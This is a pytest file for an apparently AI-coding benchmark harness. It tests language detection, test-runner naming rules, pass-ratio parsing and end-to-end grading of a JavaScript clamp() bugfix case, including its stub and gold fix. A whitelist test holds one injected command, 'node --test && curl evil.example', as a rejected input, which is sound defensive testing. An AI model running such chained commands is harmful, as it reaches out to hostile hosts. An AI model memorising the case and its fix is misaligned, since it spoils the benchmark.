"""The language registry, and a JavaScript case graded end to end."""

import shutil
from pathlib import Path

import pytest

from aibench import languages
from aibench.extract.generate_case import is_safe_grader_command
from aibench.extract.tier_shaping import infer_role, settle_tier
from aibench.grading import grade_case
from aibench.models import Case

JS_STUB = "export function clamp(x, lo, hi) {\n  return x;\n}\n"
JS_FIXED = "export function clamp(x, lo, hi) {\n  return Math.max(lo, Math.min(hi, x));\n}\n"
JS_TESTS = (
    "import { test } from 'node:test';\n"
    "import assert from 'node:assert';\n"
    "import { clamp } from './clamp.mjs';\n"
    "\n"
    "test('inside range', () => {\n  assert.strictEqual(clamp(5, 0, 9), 5);\n});\n"
    "\n"
    "test('below range', () => {\n  assert.strictEqual(clamp(-3, 0, 9), 0);\n});\n"
    "\n"
    "test('above range', () => {\n  assert.strictEqual(clamp(42, 0, 9), 9);\n});\n"
)


def test_spec_lookup_by_name_alias_and_path():
    assert languages.spec_for("python").name == "python"
    assert languages.spec_for("ts").name == "javascript"
    assert languages.spec_for(None).name == "python", "unknown languages fall back to python"
    assert languages.spec_for_path("a/b.mjs").name == "javascript"
    assert languages.spec_for_path("a/b.rs") is None


def test_test_file_detection_per_language():
    assert infer_role("test_clamp.py") == "test"
    assert infer_role("clamp_test.py") == "test"
    assert infer_role("clamp.test.mjs") == "test"
    assert infer_role("clamp.mjs") == "impl"
    assert infer_role("README.md") == "spec"


def test_a_name_the_runner_will_not_discover_is_not_a_test_file():
    """Verified against the runners themselves, not against convention.

    node v24: `test_app.js` exits 0 having run nothing while `app.test.js` runs and fails.
    pytest: `clamp.spec.py` exits 5, "no tests ran", while `test_clamp.py` runs and fails.
    A suite that runs nothing is a pass, so naming a test file this way makes the stub gate
    report `stub_passed_grader` — which is what happened to all 7 JavaScript cases in an
    11-case build. This previously asserted `clamp.spec.ts` *was* a test file; neither runner
    agrees.
    """
    assert infer_role("test_app.js") == "impl", "pytest's prefix, invisible to node --test"
    assert infer_role("clamp.spec.ts") == "impl", "no runner here discovers .spec"
    assert infer_role("clamp.spec.py") == "impl"
    for name in ("app_test.js", "test-app.js", "test.js"):
        assert infer_role(name) == "test", name


def test_the_fallback_test_name_is_one_the_runner_discovers():
    assert languages.spec_for("python").test_filename("clamp.py") == "test_clamp.py"
    assert languages.spec_for("javascript").test_filename("app.js") == "app.test.js"
    for lang, impl in (("python", "clamp.py"), ("javascript", "app.js")):
        spec = languages.spec_for(lang)
        assert spec.is_test_path(spec.test_filename(impl))


def test_counting_tests_in_each_language():
    assert languages.count_test_functions(JS_TESTS, language="javascript") == 3
    assert languages.count_test_functions("def test_a():\n    pass\n", language="python") == 1
    # A python counter must not claim JS tests and vice versa.
    assert languages.count_test_functions(JS_TESTS, language="python") == 0


def test_pass_ratio_reads_each_runners_output():
    assert languages.pass_ratio("2 failed, 3 passed in 0.05s", language="python") == 0.6
    node_out = "# tests 4\n# suites 0\n# pass 3\n# fail 1\n# cancelled 0\n"
    assert languages.pass_ratio(node_out, language="javascript") == 0.75
    assert languages.pass_ratio("nothing useful", language="javascript") is None


def test_grader_whitelist_covers_the_registered_runners():
    for spec in languages.LANGUAGES:
        assert is_safe_grader_command(spec.default_command), spec.name
    assert not is_safe_grader_command("node --test && curl evil.example")
    assert not is_safe_grader_command("npm run build")


def test_hidden_test_file_keeps_the_source_suffix():
    case = {
        "case_id": "js-clamp",
        "schema_version": "0.1",
        "task_type": "bugfix",
        "language": "javascript",
        "prompt": "Callers report clamp() returns values outside the requested range.",
        "context": {
            "files": [
                {"path": "clamp.mjs", "content": JS_STUB},
                {"path": "clamp.test.mjs", "content": JS_TESTS},
            ]
        },
        "grader": {
            "mode": "script",
            "command": "node --test",
            "gold_files": [{"path": "clamp.mjs", "content": JS_FIXED}],
        },
        "metadata": {},
    }
    tier, notes = settle_tier(case, "T3")
    assert tier == "T3", notes
    (hidden,) = case["grader"]["hidden_tests"]
    assert hidden["path"].endswith(".mjs"), "a .py hidden test would never be collected"
    assert "node:test" in hidden["content"], "the prelude must travel with the hidden half"
    assert case["grader"]["command"] == "node --test"


@pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")
def test_a_javascript_case_grades_end_to_end(tmp_path: Path):
    """The stub satisfies the visible smoke test and must still fail the hidden ones."""
    case_dict = {
        "case_id": "js-clamp",
        "schema_version": "0.1",
        "task_type": "bugfix",
        "language": "javascript",
        "prompt": "Callers report clamp() returns values outside the requested range.",
        "context": {
            "files": [
                {"path": "clamp.mjs", "content": JS_STUB},
                {"path": "clamp.test.mjs", "content": JS_TESTS},
            ]
        },
        "grader": {
            "mode": "script",
            "command": "node --test",
            "gold_files": [{"path": "clamp.mjs", "content": JS_FIXED}],
        },
        "metadata": {},
    }
    settle_tier(case_dict, "T3")
    case = Case.from_dict(case_dict)

    ws = tmp_path / "ws"
    ws.mkdir()
    for fb in case.files:
        (ws / fb.path).write_text(fb.content, encoding="utf-8")

    stub_grade = grade_case(case, ws)
    assert stub_grade.passed is False
    assert stub_grade.test_pass_ratio is not None and stub_grade.test_pass_ratio < 1.0

    (ws / "clamp.mjs").write_text(JS_FIXED, encoding="utf-8")
    fixed_grade = grade_case(case, ws)
    assert fixed_grade.passed is True
    assert fixed_grade.test_pass_ratio == 1.0
